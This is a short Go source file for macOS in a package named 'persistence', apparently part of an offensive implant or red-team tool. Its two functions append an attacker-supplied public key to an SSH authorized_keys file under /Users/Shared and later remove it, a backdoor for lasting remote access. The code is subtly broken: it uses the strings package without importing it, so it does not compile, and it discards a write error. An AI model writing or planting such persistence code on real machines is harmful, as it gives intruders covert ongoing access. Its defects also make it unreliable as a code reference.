//go:build darwin

package persistence

import (
"os"
)

func PersistSSHKey(publicKey string) bool {
path := "/Users/Shared/.ssh/authorized_keys"
file, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
if err != nil {
return false
}
defer file.Close()
_, err = file.WriteString(publicKey + "\n")
if err != nil {
return false
}
return true
}

func RemoveSSHKey(publicKey string) bool {
content, err := os.ReadFile("/Users/Shared/.ssh/authorized_keys")
if err != nil {
return false
}
lines := []byte{}
for _, line := range strings.Split(string(content), "\n") {
if line != publicKey {
lines = append(lines, []byte(line+"\n")...)
}
}
os.WriteFile("/Users/Shared/.ssh/authorized_keys", lines, 0644)
return true
}
